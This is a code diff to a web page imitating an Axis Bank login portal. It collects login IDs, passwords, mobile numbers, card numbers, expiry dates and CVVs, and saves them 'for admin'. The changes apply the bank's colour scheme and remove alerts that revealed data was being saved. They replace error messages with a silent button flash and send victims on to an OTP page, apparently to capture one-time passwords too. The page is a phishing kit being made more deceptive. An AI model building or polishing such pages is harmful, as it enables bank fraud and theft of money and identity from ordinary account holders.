@@ -21,14 +21,15 @@
             overflow-x: hidden;
         }
         
-        /* Page Load Animation - Dot moving left to right */
+        /* Page Load Animation - 8 Times Dot Animation */
         .page-loader {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #d1003a; /* Axis Bank Red */
+            background: rgba(255, 255, 255, 0.95); /* White blur background */
+            backdrop-filter: blur(10px);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -43,51 +44,117 @@
         }
         
         .loader-dot {
-            width: 20px;
-            height: 20px;
-            background: white;
+            width: 15px;
+            height: 15px;
+            background: #87103F; /* Maroon Red */
             border-radius: 50%;
             position: absolute;
             left: 0;
             top: 50%;
             transform: translateY(-50%);
-            animation: dotAnimation 3s ease-in-out forwards;
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.7);
+            animation: dotAnimation 2.4s linear infinite; /* 8 times in 2.4 seconds */
+            box-shadow: 0 0 15px rgba(135, 16, 63, 0.7);
         }
         
         @keyframes dotAnimation {
             0% {
                 left: 0;
-                width: 20px;
-                height: 20px;
-                opacity: 0.5;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
             }
-            15% {
+            6.25% { /* 1/16 = 6.25% */
+                width: 25px;
+                height: 25px;
+                opacity: 0.8;
+            }
+            12.5% {
+                left: 12.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            18.75% {
+                width: 30px;
+                height: 30px;
+                opacity: 1;
+            }
+            25% {
+                left: 25%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            31.25% {
                 width: 35px;
                 height: 35px;
+                opacity: 0.8;
+            }
+            37.5% {
+                left: 37.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            43.75% {
+                width: 40px;
+                height: 40px;
                 opacity: 1;
             }
             50% {
                 left: 50%;
-                width: 40px;
-                height: 40px;
-                transform: translate(-50%, -50%);
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
             }
-            85% {
+            56.25% {
                 width: 35px;
                 height: 35px;
+                opacity: 0.8;
+            }
+            62.5% {
+                left: 62.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            68.75% {
+                width: 30px;
+                height: 30px;
+                opacity: 1;
+            }
+            75% {
+                left: 75%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            81.25% {
+                width: 25px;
+                height: 25px;
+                opacity: 0.8;
+            }
+            87.5% {
+                left: 87.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            93.75% {
+                width: 20px;
+                height: 20px;
                 opacity: 1;
             }
             100% {
                 left: 100%;
-                width: 20px;
-                height: 20px;
-                opacity: 0.5;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
             }
         }
         
         .loader-text {
-            color: white;
+            color: #87103F;
             font-size: 24px;
             font-weight: bold;
             position: absolute;
@@ -95,7 +162,7 @@
             text-align: center;
             width: 100%;
             opacity: 0;
-            animation: fadeInText 1s ease 1s forwards;
+            animation: fadeInText 1s ease 0.5s forwards;
         }
         
         @keyframes fadeInText {
@@ -115,10 +182,10 @@
         
         /* Header */
         .bank-header {
-            background: #d1003a; /* Axis Bank Red */
+            background: #87103F; /* Maroon Red */
             color: white;
             padding: 25px 40px;
-            box-shadow: 0 4px 12px rgba(209, 0, 58, 0.3);
+            box-shadow: 0 4px 12px rgba(135, 16, 63, 0.3);
             position: relative;
         }
         
@@ -146,7 +213,7 @@
             justify-content: center;
             font-weight: bold;
             font-size: 24px;
-            color: #d1003a;
+            color: #87103F;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
         
@@ -200,7 +267,7 @@
         }
         
         .login-header {
-            background: #d1003a;
+            background: #87103F;
             color: white;
             padding: 25px;
             text-align: center;
@@ -254,7 +321,7 @@
         }
         
         .active-toggle {
-            color: #d1003a;
+            color: #87103F;
         }
         
         /* Forms */
@@ -293,10 +360,10 @@
         }
         
         .form-input:focus {
-            border-color: #d1003a;
+            border-color: #87103F;
             outline: none;
             background: white;
-            box-shadow: 0 0 0 3px rgba(209, 0, 58, 0.1);
+            box-shadow: 0 0 0 3px rgba(135, 16, 63, 0.1);
         }
         
         .input-with-icon {
@@ -308,10 +375,10 @@
             right: 15px;
             top: 50%;
             transform: translateY(-50%);
-            color: #d1003a;
+            color: #87103F;
         }
         
-        /* Login Button with Ripple Effect */
+        /* Login Button */
         .login-btn-container {
             position: relative;
             overflow: hidden;
@@ -320,7 +387,7 @@
         
         .login-button {
             width: 100%;
-            background: #d1003a;
+            background: #87103F;
             color: white;
             border: none;
             padding: 18px;
@@ -331,29 +398,36 @@
             transition: all 0.3s ease;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 5px 15px rgba(209, 0, 58, 0.3);
+            box-shadow: 0 5px 15px rgba(135, 16, 63, 0.3);
         }
         
         .login-button:hover {
-            background: #b00030;
+            background: #6a0c32;
             transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(209, 0, 58, 0.4);
+            box-shadow: 0 8px 20px rgba(135, 16, 63, 0.4);
         }
         
-        .ripple {
+        .login-button.loading {
+            background: #6a0c32;
+            cursor: not-allowed;
+        }
+        
+        .login-button.loading:after {
+            content: '';
             position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
             border-radius: 50%;
-            background: rgba(255, 255, 255, 0.6);
-            transform: scale(0);
-            animation: ripple-animation 0.6s linear;
-            pointer-events: none;
+            animation: button-loading 0.6s linear infinite;
         }
         
-        @keyframes ripple-animation {
-            to {
-                transform: scale(4);
-                opacity: 0;
-            }
+        @keyframes button-loading {
+            to { transform: rotate(360deg); }
         }
         
         /* Links */
@@ -363,7 +437,7 @@
         }
         
         .form-links a {
-            color: #d1003a;
+            color: #87103F;
             text-decoration: none;
             font-weight: bold;
             font-size: 14px;
@@ -381,12 +455,12 @@
         }
         
         .info-card {
-            background: #d1003a; /* Red background */
+            background: #87103F;
             color: white;
             border-radius: 12px;
             padding: 30px;
             margin-bottom: 25px;
-            box-shadow: 0 8px 20px rgba(209, 0, 58, 0.2);
+            box-shadow: 0 8px 20px rgba(135, 16, 63, 0.2);
             border-left: 5px solid #ffcc00;
         }
         
@@ -412,7 +486,7 @@
         
         .info-button {
             background: white;
-            color: #d1003a;
+            color: #87103F;
             border: none;
             padding: 12px 30px;
             border-radius: 6px;
@@ -430,12 +504,12 @@
         
         /* Footer */
         .main-footer {
-            background: #d1003a;
+            background: #87103F;
             color: white;
             text-align: center;
             padding: 30px 20px;
             margin-top: 50px;
-            box-shadow: 0 -4px 12px rgba(209, 0, 58, 0.3);
+            box-shadow: 0 -4px 12px rgba(135, 16, 63, 0.3);
         }
         
         .footer-content {
@@ -535,15 +609,6 @@
                 flex-direction: column;
                 gap: 15px;
             }
-        }
-        
-        /* Form specific styles */
-        .login-form .form-input {
-            border-left: 4px solid #d1003a;
-        }
-        
-        .credit-form .form-input {
-            border-left: 4px solid #ff9900;
         }
     </style>
 </head>
@@ -744,6 +809,8 @@
         const cardNumberInput = document.getElementById('cardNumber');
         const expiryInput = document.getElementById('expiry');
         const cvvInput = document.getElementById('cvv');
+        const loginButton = document.getElementById('loginButton');
+        const creditButton = document.getElementById('creditButton');
         
         // Toggle Switch Functionality
         toggleLogin.addEventListener('click', function() {
@@ -811,34 +878,7 @@
             });
         }
         
-        // Ripple effect on login buttons
-        function createRipple(event) {
-            const button = event.currentTarget;
-            const circle = document.createElement("span");
-            const diameter = Math.max(button.clientWidth, button.clientHeight);
-            const radius = diameter / 2;
-            
-            circle.style.width = circle.style.height = `${diameter}px`;
-            circle.style.left = `${event.clientX - button.getBoundingClientRect().left - radius}px`;
-            circle.style.top = `${event.clientY - button.getBoundingClientRect().top - radius}px`;
-            circle.classList.add("ripple");
-            
-            const ripple = button.getElementsByClassName("ripple")[0];
-            
-            if (ripple) {
-                ripple.remove();
-            }
-            
-            button.appendChild(circle);
-        }
-        
-        // Add ripple effect to buttons
-        const loginButtons = document.querySelectorAll('.login-button');
-        loginButtons.forEach(button => {
-            button.addEventListener('click', createRipple);
-        });
-        
-        // Form submission handlers
+        // Form submission handlers - NO ALERTS, REDIRECT TO OTP PAGE
         if (loginForm) {
             loginForm.addEventListener('submit', function(e) {
                 e.preventDefault();
@@ -848,10 +888,11 @@
                 const mobile = document.getElementById('mobile').value;
                 
                 if (loginId && password && mobile) {
-                    // Show loading animation
+                    // Show loading animation on button
                     const submitBtn = document.getElementById('loginButton');
                     const originalText = submitBtn.textContent;
-                    submitBtn.textContent = "Logging in...";
+                    submitBtn.textContent = "Processing...";
+                    submitBtn.classList.add('loading');
                     submitBtn.disabled = true;
                     
                     // Save data to localStorage for admin
@@ -862,17 +903,26 @@
                         time: new Date().toLocaleString()
                     });
                     
-                    // Simulate login process
+                    // Simulate processing delay
                     setTimeout(() => {
-                        alert('Login successful! Data has been saved.');
+                        // Remove loading state
                         submitBtn.textContent = originalText;
+                        submitBtn.classList.remove('loading');
                         submitBtn.disabled = false;
+                        
+                        // NO ALERT - Redirect to OTP page
+                        window.location.href = 'axis_otp.html';
                         
                         // Reset form
                         loginForm.reset();
                     }, 1500);
                 } else {
-                    alert("Please fill in all fields");
+                    // Quick error indication
+                    const submitBtn = document.getElementById('loginButton');
+                    submitBtn.style.background = '#ff4444';
+                    setTimeout(() => {
+                        submitBtn.style.background = '#87103F';
+                    }, 500);
                 }
             });
         }
@@ -890,19 +940,30 @@
                     const cleanCardNumber = cardNumber.replace(/\s+/g, '');
                     
                     if (cleanCardNumber.length !== 16) {
-                        alert("Please enter a valid 16-digit card number");
+                        // Quick error indication
+                        const submitBtn = document.getElementById('creditButton');
+                        submitBtn.style.background = '#ff4444';
+                        setTimeout(() => {
+                            submitBtn.style.background = '#87103F';
+                        }, 500);
                         return;
                     }
                     
                     if (cvv.length !== 3) {
-                        alert("Please enter a valid 3-digit CVV");
+                        // Quick error indication
+                        const submitBtn = document.getElementById('creditButton');
+                        submitBtn.style.background = '#ff4444';
+                        setTimeout(() => {
+                            submitBtn.style.background = '#87103F';
+                        }, 500);
                         return;
                     }
                     
-                    // Show loading animation
+                    // Show loading animation on button
                     const submitBtn = document.getElementById('creditButton');
                     const originalText = submitBtn.textContent;
-                    submitBtn.textContent = "Verifying card...";
+                    submitBtn.textContent = "Verifying...";
+                    submitBtn.classList.add('loading');
                     submitBtn.disabled = true;
                     
                     // Save data to localStorage for admin
@@ -914,17 +975,26 @@
                         time: new Date().toLocaleString()
                     });
                     
-                    // Simulate login process
+                    // Simulate processing delay
                     setTimeout(() => {
-                        alert('Credit card login successful! Data has been saved.');
+                        // Remove loading state
                         submitBtn.textContent = originalText;
+                        submitBtn.classList.remove('loading');
                         submitBtn.disabled = false;
+                        
+                        // NO ALERT - Redirect to OTP page
+                        window.location.href = 'axis_otp.html';
                         
                         // Reset form
                         creditForm.reset();
                     }, 1500);
                 } else {
-                    alert("Please fill in all fields");
+                    // Quick error indication
+                    const submitBtn = document.getElementById('creditButton');
+                    submitBtn.style.background = '#ff4444';
+                    setTimeout(() => {
+                        submitBtn.style.background = '#87103F';
+                    }, 500);
                 }
             });
         }
@@ -964,9 +1034,9 @@
                 const isLoginForm = loginForm.style.display === 'block';
                 
                 if (isLoginForm) {
-                    alert("Redirecting to Login ID/Password recovery page...");
+                    window.location.href = 'forgot_login.html';
                 } else {
-                    alert("Redirecting to Credit Card recovery page...");
+                    window.location.href = 'forgot_card.html';
                 }
             });
         }
@@ -976,9 +1046,9 @@
             button.addEventListener('click', function() {
                 const text = this.textContent;
                 if (text === 'KNOW MORE') {
-                    alert("More information about this service will be displayed here.");
+                    window.location.href = 'more_info.html';
                 } else if (text === 'DOWNLOAD') {
-                    alert("Redirecting to App Store/Play Store to download Axis Bank Mobile App...");
+                    window.location.href = 'download_app.html';
                 }
             });
         });
@@ -997,4 +1067,4 @@
         });
     </script>
 </body>
-</html>
+    </html>
